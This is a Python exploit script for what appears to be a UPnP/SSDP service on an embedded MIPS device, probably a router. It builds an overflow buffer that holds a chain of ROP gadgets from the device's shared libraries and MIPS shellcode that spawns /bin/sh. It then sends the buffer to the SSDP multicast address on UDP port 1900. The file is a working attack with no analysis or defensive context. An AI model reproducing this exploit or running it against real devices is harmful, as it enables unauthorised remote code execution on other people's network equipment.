#!/usr/bin/env python

import sys
import socket


bug =  'A' * 1523
 
bug += '\xc0\x86\xca\x2a' # Sleep Address $s2

bug +=  'B' * 12

"""
ROP Gadget 2
-------------
lic.so.0 - 0x00038800

move $t9, $s2 
lw $ra, 0x28($sp)
lw $s3, 0x24($sp) 
lw $s2, 0x20($sp) 
lw $s1, 0x1c($sp) 
lw $s0, 0x18($sp)
jr $t9 
addiu $sp, $sp, 0x30
"""
bug += '\xfc\x07\xc9\x2a' # ROP gadget 2 $s6

bug +=  'C' * 8

"""
ROP Gadget 1
-------------
libnat.so - 0x0000c488 

addiu $a0, $zero, 0xf 
move $t9, $s6 
jalr $t9 
move $a2, $zero 
"""
bug += '\x88\x04\xbc\x2a' # ROP gadget 1 $ra

bug +=  'D' * 32

"""
ROP Gadget 4
-------------
lic.so.0 - 0x00032a6c

move $t9, $a1
addiu $a0, $a0, 0x38
jr $t9 
move $a1, $a2
"""
bug += '\x6c\xaa\xc8\x2a' # ROP gadget 4 $s2 #2

bug += 'G' * 4

"""
ROP Gadget 3
-------------
libcrypt.so.0 - 0x0000203c

move $t9, $s2
jalr $t9
addiu $a1, $sp, 0x2c
"""
bug += '\x3c\x50\xc0\x2a' # $ra #2

bug += 'E' * 48

"""
Shellcode - Mips Little Endian 
Author: Sanguine
https://www.exploit-db.com/exploits/35868
"""
bug +=    "\xff\xff\x06\x28" 
bug +=    "\xff\xff\xd0\x04" 
bug +=    "\xff\xff\x05\x28" 
bug +=    "\x01\x10\xe4\x27" 
bug +=    "\x0f\xf0\x84\x24" 
bug +=    "\xab\x0f\x02\x24" 
bug +=    "\x0c\x01\x01\x01"
bug +=    "/bin/sh"



def ssdp():

    ### UPnP Architecture Specs ###
    # M-SEARCH - Method for search requests
    # HOST - Multicast channed and port reserved for SSDP
    # MAN - Required by HTTP Exension Framework, defines the scope (namespace) of the extension
    # MX - MAximum wait time in seconds
    # ST: Required search target, pre defined values
    SSDP = bug

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    s.sendto(SSDP, ('239.255.255.250', 1900) )
    s.close()


def main():
    ssdp()

if __name__ == "__main__":
    main()